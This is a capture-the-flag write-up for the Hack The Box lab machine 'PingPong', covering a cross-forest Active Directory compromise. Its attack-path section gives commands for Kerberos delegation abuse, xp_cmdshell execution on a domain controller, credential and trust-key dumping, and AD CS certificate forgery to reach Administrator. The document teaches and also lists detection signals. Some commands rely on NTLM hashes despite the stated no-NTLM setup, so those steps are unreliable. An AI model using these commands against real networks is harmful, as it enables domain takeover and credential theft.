---
layout: default
title: "PingPong"
parent: Hard Machines
grand_parent: Machines
permalink: /machines/hard/pingpong/
---

# PingPong

![Machine Badge](https://img.shields.io/badge/Machine-PingPong-blue)
![OS](https://img.shields.io/badge/OS-Windows-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Hard-orange)
![Season](https://img.shields.io/badge/Season-10%20Week%2013-purple)

| Property | Value |
|----------|-------|
| **OS** | Windows (Multi-Forest AD) |
| **Difficulty** | Hard (frequently listed Insane on weekly drop) |
| **Release** | 2026-04-25 (Season 10, Final Week) |
| **Tags** | #active-directory #cross-forest-trust #kerberos-only #mssql-delegation #adcs #aes256 #no-ntlm |

---

## Summary

PingPong is an assume-breach, two-forest Active Directory engagement.

- **PING.HTB** -> DC1: `dc1.ping.htb` (external entry point)
- **PONG.HTB** -> DC2: `dc2.pong.htb` (internal-only, reachable via DC1)
- **Bidirectional trust** between the forests
- **NTLM is disabled on both domains** (Kerberos-only authentication)
- **RC4 is disabled on PONG.HTB** (AES256 keys mandatory)
- **Significant host clock skew** from real UTC, requiring `faketime` / `ntpdate` workarounds on every Kerberos operation

Starting from a low-privilege foothold in `ping.htb`, the path leverages Kerberos and MSSQL delegation to compromise `dc2.pong.htb`, extracts cross-realm credential material, and returns to `ping.htb` to abuse **AD CS**, obtaining a certificate that maps to `Administrator@ping.htb`.

---

## External Writeups

- [HackIndex - PingPong](https://hackindex.io/writeups/pingpong)
- [Axura (Protected)](https://4xura.com/writeups-for-ctfs/htb/htb-writeup-pingpong/)
- [Ibrahim Isiaq Bolaji](https://www.ibrahimisiaqbolaji.com/2026/04/pingpong-htb-write-up.html)
- [Toshith's Blog](https://blog.toshith.in/story/NjY)
- [vapt.services - Red Team Simulation](https://vapt.services/pingpong-htb-machine-a-realistic-red-team-simulation-in-disguise/)
- [CyberSecGuru: Mastering PingPong](https://thecybersecguru.com/ctf-walkthroughs/beginners-guide-to-conquering-pingpong-on-hackthebox/)
- [1337 Sheets - PingPong Insane (Apr 25, 2026)](https://1337sheets.com/hack-the-box-season-10-htb-pingpong-writeup-insane-weekly-april-25th-2026/)
- [Buy Me a Coffee - Step-by-step Explanation](https://buymeacoffee.com/thecybersecguru/pingpong-htb-step-step-writeup-explanation)

---

## Key Techniques

- Cross-forest trust enumeration (`Get-ADTrust`, `nltest /domain_trusts`)
- Kerberos-only authentication (no NTLM fallback)
- AES256 Kerberos keys (RC4 disabled) - `ticketer.py` / `getTGT` flags
- Clock skew workaround (`ntpdate`, `faketime`) for every Kerberos call
- MSSQL constrained delegation across forest trust
- S4U2Self + S4U2Proxy with cross-realm referrals
- AD CS ESC1/ESC8 template abuse for `Administrator@ping.htb` certificate mapping
- PKINIT authentication with forged certificate

---

## Attack Path

### 1. Time Sync

```bash
sudo ntpdate -u dc1.ping.htb
# or per-command:
faketime "$(rdate -p dc1.ping.htb)" impacket-getTGT ...
```

### 2. Enumerate Cross-Forest Trust

```bash
impacket-rpcdump -no-pass @dc1.ping.htb
bloodhound-python -u <user> -p <pw> -d ping.htb -dc dc1.ping.htb -c All
# Confirm trust: ping.htb <-> pong.htb (bidirectional)
nslookup dc2.pong.htb dc1.ping.htb
```

### 3. MSSQL Delegation Pivot to PONG.HTB

A service account in `ping.htb` has constrained delegation to an MSSQL SPN on `dc2.pong.htb`:

```bash
impacket-getTGT ping.htb/svc_sql:'<pw>' -aesKey <aes256>
# S4U2Self + S4U2Proxy across trust:
impacket-getST -spn 'MSSQLSvc/dc2.pong.htb:1433' \
  -impersonate Administrator -dc-ip dc1.ping.htb \
  ping.htb/svc_sql -k -no-pass -aesKey <aes256>
```

The cross-realm referral chain produces a ST for `Administrator@PONG.HTB` via the trust. Use it:

```bash
impacket-mssqlclient -k dc2.pong.htb -no-pass
# Inside MSSQL:
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';  -- nt authority\system on DC2 if delegation chains correctly
```

### 4. Extract Cross-Realm Trust Key

From `dc2.pong.htb` SYSTEM:

```bash
impacket-secretsdump -k -no-pass dc2.pong.htb
# inter-realm trust keys: PONG.HTB <-> PING.HTB
```

The trust key allows forging cross-realm referral TGTs back into `ping.htb`.

### 5. AD CS to Administrator@ping.htb

Enumerate certificate templates on `ping.htb`:

```bash
certipy find -u <user>@ping.htb -hashes :<NT> -dc-ip dc1.ping.htb -vulnerable
# Identify ESC1 / ESC8 template
```

ESC1 path: request a cert specifying `userPrincipalName = Administrator@ping.htb`:

```bash
certipy req -u svc_sql@ping.htb -hashes :<NT> \
  -ca PING-CA -template VulnTemplate \
  -upn Administrator@ping.htb -dc-ip dc1.ping.htb
```

PKINIT authentication with the forged cert yields `Administrator@PING.HTB`:

```bash
certipy auth -pfx administrator.pfx -dc-ip dc1.ping.htb
# NT hash recovered, PSExec / WMIExec as Administrator
```

---

## Lessons Learned

- **No-NTLM AD is the future.** Tooling that assumes NTLM fallback (most Impacket commands without `-k`) will silently fail. Always pass `-k -no-pass -aesKey`.
- **Cross-forest constrained delegation** is undertaught and frequently misconfigured. Trust + delegation is the modern "golden ticket without the golden ticket".
- **AD CS ESC1/ESC8** survives despite years of warnings; the forged-UPN trick remains effective when `EDITF_ATTRIBUTESUBJECTALTNAME2` or "Supply in request" templates exist.
- **Clock skew** is the #1 silent killer of Kerberos attack chains. `ntpdate` or `faketime` before every `getST`.
- Multi-forest assume-breach is the closest HTB has come to a real red-team scenario.

---

## Detection

- LDAP `msDS-AllowedToDelegateTo` modifications.
- Kerberos referral TGT requests with `msDS-CrossDomainAccountInfo` set.
- AD CS event 4886 (certificate request) with a UPN/SAN mismatching the requester's account.
- `xp_cmdshell` enable + execute on a DC (highly anomalous).
